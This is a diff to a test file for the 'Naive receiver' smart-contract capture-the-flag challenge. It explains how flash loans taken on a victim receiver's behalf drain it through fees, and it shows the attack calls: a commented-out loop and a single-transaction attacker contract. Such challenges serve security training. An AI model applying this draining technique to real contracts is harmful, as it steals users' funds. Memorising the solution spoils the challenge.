@@ -49,11 +49,14 @@ describe("[Challenge] Naive receiver", function () {
   it("Exploit", async function () {
     // can get a flash loan on receiver's behalf because they check msg.sender == pool
     // which is always true because the loan comes from the pool smart contract
+    // each flash loan costs a fee and drains the user's balance
+
+    // without separate contract
     // while ((await balance.current(this.receiver.address)).gte(ether("1"))) {
     //   await this.pool.flashLoan(this.receiver.address, ETHER_IN_POOL);
     // }
 
-    // single tx
+    // in a single tx using a custom contract
     this.attacker = await NaiveReceiverAttacker.new({ from: attacker });
     await this.attacker.attack(this.pool.address, this.receiver.address)
   });
